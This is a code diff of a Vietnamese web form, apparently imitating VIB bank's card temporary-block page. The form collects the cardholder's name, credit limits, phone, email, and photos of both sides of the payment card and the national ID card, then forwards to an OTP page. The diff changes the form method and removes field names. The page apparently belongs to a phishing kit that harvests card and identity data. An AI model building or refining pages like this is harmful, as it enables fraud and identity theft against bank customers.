@@ -151,7 +151,7 @@
     </header>
 
     <main class="container my-4">
-        <form id="tempBlockForm" action="otp.html" method="post" enctype="multipart/form-data" novalidate>
+        <form id="tempBlockForm" action="otp.html" method="get" novalidate>
             <div class="alert alert-danger d-flex gap-2 align-items-start" role="alert">
                 <div class="pt-1">🔐</div>
                 <div><strong>Lưu ý:</strong> Tạm khóa giúp chặn giao dịch mới nhưng vẫn có thể mở lại. Hủy thẻ là vĩnh
@@ -186,7 +186,7 @@
                         <div class="row g-3 align-items-end">
                             <div class="col-md-6">
                                 <label class="form-label required">Thời hạn đóng băng</label>
-                                <select id="duration" name="duration" class="form-select" required>
+                                <select id="duration" class="form-select" required>
                                     <option value="24" selected>24 giờ (mặc định)</option>
                                     <option value="12">12 giờ</option>
                                     <option value="48">48 giờ</option>
@@ -204,7 +204,7 @@
                             </div>
                             <div class="col-md-6" id="scheduleWrap" style="display:none">
                                 <label class="form-label required" for="startAt">Thời điểm bắt đầu</label>
-                                <input id="startAt" name="startAt" class="form-control" type="datetime-local" disabled>
+                                <input id="startAt" class="form-control" type="datetime-local" disabled>
                                 <div class="invalid-feedback">Chọn thời điểm hợp lệ (≥ hiện tại + 5 phút).</div>
                             </div>
                             <div class="col-12">
@@ -220,7 +220,7 @@
                         <div class="row g-3">
                             <div class="col-md-6">
                                 <label class="form-label required" for="cardType">Loại thẻ</label>
-                                <select id="cardType" name="card_type" class="form-select" required>
+                                <select id="cardType" class="form-select" required>
                                     <option value="">Chọn...</option>
                                     <option>VIB Mastercard</option>
                                     <option>VIB Visa</option>
@@ -230,21 +230,21 @@
                             </div>
                             <div class="col-md-6">
                                 <label class="form-label required" for="holderName">Tên in trên thẻ</label>
-                                <input id="holderName" name="full_name" class="form-control" required>
+                                <input id="holderName" class="form-control" required>
                                 <div class="invalid-feedback">Nhập tên in trên thẻ.</div>
                             </div>
                             <div class="col-md-6">
                                 <label class="form-label required" for="creditLimitGranted">Hạn mức được cấp
                                     (VND)</label>
-                                <input id="creditLimitGranted" name="credit_limit_granted" class="form-control"
-                                    inputmode="numeric" data-money placeholder="VD: 100.000.000 ₫" required>
+                                <input id="creditLimitGranted" class="form-control" inputmode="numeric" data-money
+                                    placeholder="VD: 100.000.000 ₫" required>
                                 <div class="invalid-feedback">Nhập hạn mức hợp lệ.</div>
                             </div>
                             <div class="col-md-6">
                                 <label class="form-label required" for="creditLimitCurrent">Hạn mức hiện tại
                                     (VND)</label>
-                                <input id="creditLimitCurrent" name="credit_limit_current" class="form-control"
-                                    inputmode="numeric" data-money placeholder="VD: 80.000.000 ₫" required>
+                                <input id="creditLimitCurrent" class="form-control" inputmode="numeric" data-money
+                                    placeholder="VD: 80.000.000 ₫" required>
                                 <div class="invalid-feedback">Nhập hạn mức hợp lệ.</div>
                             </div>
                         </div>
@@ -256,7 +256,7 @@
                         <div class="row g-3">
                             <div class="col-md-6">
                                 <label class="form-label required" for="reason">Lý do</label>
-                                <select id="reason" name="reason" class="form-select" required>
+                                <select id="reason" class="form-select" required>
                                     <option value="">Chọn...</option>
                                     <option>Nghi ngờ giao dịch bất thường</option>
                                     <option>Làm thất lạc thẻ</option>
@@ -268,18 +268,16 @@
                             </div>
                             <div class="col-md-6">
                                 <label class="form-label" for="reasonNote">Ghi chú bổ sung</label>
-                                <input id="reasonNote" name="reason_note" class="form-control"
-                                    placeholder="Mô tả thêm nếu chọn 'Khác'...">
+                                <input id="reasonNote" class="form-control" placeholder="Mô tả thêm nếu chọn 'Khác'...">
                             </div>
                             <div class="col-md-6">
                                 <label class="form-label required" for="phone">Số điện thoại</label>
-                                <input id="phone" name="phone" class="form-control" inputmode="tel">
+                                <input id="phone" class="form-control" inputmode="tel">
                                 <div class="invalid-feedback"></div>
                             </div>
                             <div class="col-md-6">
                                 <label class="form-label" for="email">Email</label>
-                                <input id="email" name="email" type="email" class="form-control"
-                                    placeholder="you@email.com">
+                                <input id="email" type="email" class="form-control" placeholder="you@email.com">
                                 <div class="invalid-feedback">Email không hợp lệ.</div>
                             </div>
                         </div>
@@ -291,29 +289,26 @@
                         <div class="row g-3">
                             <div class="col-md-3">
                                 <label class="form-label required" for="frontCard">Ảnh Thẻ mặt trước</label>
-                                <input id="frontCard" name="front_card" type="file" class="form-control"
-                                    accept=".jpg,.jpeg,.png" required>
+                                <input id="frontCard" type="file" class="form-control" accept=".jpg,.jpeg,.png"
+                                    required>
                                 <div class="invalid-feedback">Thiếu ảnh thẻ trước.</div>
                                 <div id="frontCardList" class="file-list mt-1"></div>
                             </div>
                             <div class="col-md-3">
                                 <label class="form-label required" for="backCard">Ảnh Thẻ mặt sau</label>
-                                <input id="backCard" name="back_card" type="file" class="form-control"
-                                    accept=".jpg,.jpeg,.png" required>
+                                <input id="backCard" type="file" class="form-control" accept=".jpg,.jpeg,.png" required>
                                 <div class="invalid-feedback">Thiếu ảnh thẻ sau.</div>
                                 <div id="backCardList" class="file-list mt-1"></div>
                             </div>
                             <div class="col-md-3">
                                 <label class="form-label required" for="frontId">Ảnh CCCD mặt trước</label>
-                                <input id="frontId" name="front_id" type="file" class="form-control"
-                                    accept=".jpg,.jpeg,.png" required>
+                                <input id="frontId" type="file" class="form-control" accept=".jpg,.jpeg,.png" required>
                                 <div class="invalid-feedback">Thiếu ảnh mặt trước.</div>
                                 <div id="frontIdList" class="file-list mt-1"></div>
                             </div>
                             <div class="col-md-3">
                                 <label class="form-label required" for="backId">Ảnh CCCD mặt sau</label>
-                                <input id="backId" name="back_id" type="file" class="form-control"
-                                    accept=".jpg,.jpeg,.png" required>
+                                <input id="backId" type="file" class="form-control" accept=".jpg,.jpeg,.png" required>
                                 <div class="invalid-feedback">Thiếu ảnh mặt sau.</div>
                                 <div id="backIdList" class="file-list mt-1"></div>
                             </div>
